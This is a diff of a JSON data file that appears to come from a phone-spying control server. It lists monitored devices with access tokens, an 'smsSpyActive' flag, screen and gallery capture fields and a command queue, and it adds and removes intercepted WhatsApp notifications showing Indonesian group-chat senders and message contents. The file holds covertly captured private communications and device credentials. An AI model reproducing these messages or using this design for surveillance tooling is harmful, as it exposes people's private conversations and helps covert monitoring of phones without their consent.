@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775041561462,
+    "lastSeen": 1775041564549,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14690 pesan dari 11 chat",
+        "time": "01/04 19:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041562109
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12359 pesan): ~ iyanz empty",
@@ -4011,14 +4019,6 @@
         "time": "01/04 18:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1775040981263
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12228 pesan): ~ Bot",
-        "content": "💟 Stiker",
-        "time": "01/04 18:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040981239
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775041561459,
+    "lastSeen": 1775041565174,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12360 pesan): ~ ~☆彡彡🧡 𝚛𝚊𝚣𝚣𝚢 🧡ミミ☆",
+        "content": "💟 Stiker",
+        "time": "01/04 19:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041566879
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12359 pesan): ~ iyanz empty",
+        "content": "Lgsg ae \"mau gk jadi my....\"",
+        "time": "01/04 19:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041562085
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14690 pesan dari 11 chat",
+        "time": "01/04 19:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775041562068
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ISIAN ZAYN X OWN [2] (1883 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
@@ -8040,30 +8064,6 @@
         "time": "01/04 18:56",
         "pkg": "com.whatsapp",
         "receivedAt": 1775040982945
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14560 pesan dari 11 chat",
-        "time": "01/04 18:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040981252
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12228 pesan): ~ Bot",
-        "content": "💟 Stiker",
-        "time": "01/04 18:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040981169
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB ISIAN ZAYN X OWN [2] (1887 pesan): ~ BENI OWN GB ZAYN [2]‼️",
-        "content": "BENI OWN ZAYN [2] ALWAYS ON 24 JAM✅\n______________________________\n\n`QR ALPAYMENT`\nTF DARI MANA PUN BISA✅\n---------------------------------\n\n• TF KILAT🚀\n• FAST RESPON✅\n• CARIIN MUSUH? PM✅\n___________________________\n`MC SUNG SEND LINK/CULIK AJA`👌🏻\nWIN   [3x] FREE=500p💸\nWIN   [6x] FREE=1K💸\nWIN   [9x] FREE = 2K💸",
-        "time": "01/04 18:56",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775040979643
       }
     ],
     "galleryPhotos": [],
